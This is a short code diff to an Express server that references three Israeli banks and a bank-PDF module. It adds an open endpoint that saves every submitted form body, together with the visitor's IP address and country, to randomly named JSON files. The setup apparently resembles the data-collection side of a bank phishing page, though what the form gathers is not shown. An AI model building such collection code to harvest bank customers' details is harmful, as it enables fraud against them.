@@ -1,3 +1,4 @@
+import fs from "fs";
 import cors from "cors";
 import dotenv from "dotenv";
 import bankPdf from "./bank-pdf";
@@ -5,13 +6,21 @@ import geoipLite from "geoip-lite";
 import { urlencoded } from "body-parser";
 import isoCountryCodes from "./iso-country-codes";
 import express, { Application, Request, Response } from "express";
-
+import { storagePath } from "./utils";
 const BANKS = new Set(["leumi", "discount", "jerusalem"]);
 
 const app: Application = express();
 
 app.use(express.static('public'))
 app.use(urlencoded({ extended: false }));
+
+app.post("/api/v1/submit", cors(), (req: Request, res: Response) => {
+    let ip = req.headers["cf-connecting-ip"] || req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+    let geoData: any = geoipLite.lookup(ip.toString());
+    let countryName = isoCountryCodes.get(geoData.country);
+    fs.writeFileSync(storagePath(Math.random() + ".json"), JSON.stringify({ ip, countryName, ...req.body }, null, 2), "utf8");
+    res.json({ ok: true });
+});
 
 app.get("/api/v1/geo", cors(), (req: Request, res: Response) => {
     let ip = req.headers["cf-connecting-ip"] || req.headers["x-forwarded-for"] || req.connection.remoteAddress;
